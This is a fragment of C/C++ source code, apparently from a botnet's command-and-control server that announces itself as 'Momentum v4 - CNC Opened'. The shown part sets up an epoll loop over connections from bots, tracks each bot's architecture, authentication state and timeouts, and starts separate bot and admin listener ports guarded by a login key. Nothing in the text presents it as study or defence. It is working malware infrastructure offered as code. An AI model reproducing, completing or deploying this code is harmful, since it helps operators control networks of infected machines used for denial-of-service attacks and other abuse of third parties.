    struct epoll_event *es;
    pthread_t client_timeout_thread;

    efd = epoll_create1(0);
    if(efd == -1)
    {
        _exit("Failed to create the epoll fd", 1);
    }
    client_event.data.fd = client_fd;
    client_event.events = EPOLLIN | EPOLLET;
    ret = epoll_ctl(efd, EPOLL_CTL_ADD, client_fd, &client_event);
    if(ret)
    {
        _exit("Failed to add the fd to epoll", 1);
    }
    admin_event.data.fd = admin_fd;
    admin_event.events = EPOLLIN | EPOLLET;
    ret = epoll_ctl(efd, EPOLL_CTL_ADD, admin_fd, &admin_event);
    if(ret)
    {
        _exit("Failed to add the fd to epoll", 1);
    }
    client_list = (struct clients *)calloc(MAX_BOTS, sizeof(struct clients));
    if(!client_list)
    {
        _exit("Failed to allocate memory for the client list", 1);;
    }

    for(x = 0; x < MAX_BOTS; x++)
    {
        client_list[x].fd = -1;
        client_list[x].connected = FALSE;
        client_list[x].addr = 0;
        client_list[x].authenticated = FALSE;
        client_list[x].timeout = 0;
        client_list[x].arch_len = 0;
        memset(client_list[x].arch, 0, 64);
    }

    es = (struct epoll_event *)calloc(MAX_BOTS, sizeof(struct epoll_event));
    if(!es)
    {
        _exit("Failed to allocate memory for the epoll events", 1);
    }
    pthread_create(&client_timeout_thread, NULL, client_timeout, NULL);

    while(TRUE)
    {
        int n = 0;
        int i = 0;
        int cfd = -1;

        n = epoll_wait(efd, es, MAX_BOTS, -1);
        if(n == -1)
        {
            std::cout << "Epoll error" << std::endl;
            break;
        }

        for(i = 0; i < n; i++)
            process_event(&es[i], efd);
    }

    free(es);
    free(client_list);
    close(efd);
    _exit("Epoll finished", 1);
}

int main(void)
{
    std::cout << "\e[37;1m-== \e[0m\e[31mMomentum v4 \e[37;1m- \e[32mCNC Opened \e[37;1m==-" << std::endl;
    std::cout << "\r\n- \e[37;1mBot port: \e[37;1m" << CLIENT_PORT << std::endl;
    std::cout << "\r\n- \e[37;1mAdmin port: \e[37;1m" << ADMIN_PORT << " \r\n (\e[32;1mCNC Server | Connection: \e[0m\e[31mRAW\e[37;1m)\r\n- \e[37;1mLogin KEY: \e[37;1m" << MANAGER_AUTH_KEY << std::endl;
   
    mysql_clear_login();
    client_bind();
    admin_bind();
    epoll_handler();
    return 0;
}
